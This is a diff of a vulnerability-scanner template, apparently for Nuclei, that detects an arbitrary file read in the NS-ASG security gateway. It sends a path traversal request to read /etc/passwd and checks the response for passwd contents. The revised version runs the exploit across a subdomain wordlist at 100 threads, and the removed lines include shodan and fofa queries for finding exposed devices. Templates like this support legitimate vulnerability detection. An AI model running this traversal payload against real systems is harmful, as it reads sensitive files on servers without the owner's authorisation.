@@ -1,26 +1,34 @@
-id: ns-asg-file-read
+id: nsasg-arbitrary-file-read
 
 info:
   name: NS ASG Arbitrary File Read
-  author: pikpikcu,ritikchaddha
+  author: pikpikcu
   severity: high
-  description: |
-    fofa-query: app="网康科技-NS-ASG安全网关"
-    shodan-query: http.title:“NS-ASG”
-  reference:
-    - https://zhuanlan.zhihu.com/p/368054963
-    - http://wiki.xypbk.com/Web安全/网康%20NS-ASG安全网关/网康%20NS-ASG安全网关%20任意文件读取漏洞.md
+  reference: https://zhuanlan.zhihu.com/p/368054963
+  tags: nsasg,lfi
 
-rules:
-    r0:
-        request:
-            method: GET
-            path: /admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
-        expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-    r1:
-        request:
-            method: GET
-            path: /admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php
-        expression: response.status == 200 && response.body.bcontains(b"$certfile") && response.body.bcontains(b"application/pdf")
-expression: r0() || r1()
- 
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
+      - |
+        GET /admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+        Accept-Encoding: gzip
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "root:.*:0:0"
+
+      - type: status
+        status:
+          - 200
